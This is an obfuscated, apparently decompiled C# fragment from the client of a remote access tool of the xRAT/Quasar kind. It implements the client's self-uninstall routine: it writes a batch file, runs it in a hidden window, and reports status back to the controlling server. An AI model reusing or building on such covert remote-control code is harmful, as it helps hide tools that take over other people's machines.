using System;
using System.Diagnostics;
using xClient.Core.Packets.ClientPackets;

public static class GClass36
{
	public static void smethod_0(GClass33 client)
	{
		try
		{
			if (GClass0.bool_1)
			{
				GClass38.smethod_1();
			}
			string text = GClass42.smethod_4(GClass0.bool_0 && GClass0.bool_2);
			if (string.IsNullOrEmpty(text))
			{
				throw new Exception("Could not create uninstall-batch file");
			}
			Process.Start(new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = true,
				FileName = text
			});
			Class0.gclass34_0.method_21();
		}
		catch (Exception ex)
		{
			new SetStatus($"Uninstallation failed: {ex.Message}").Execute(client);
		}
	}
}
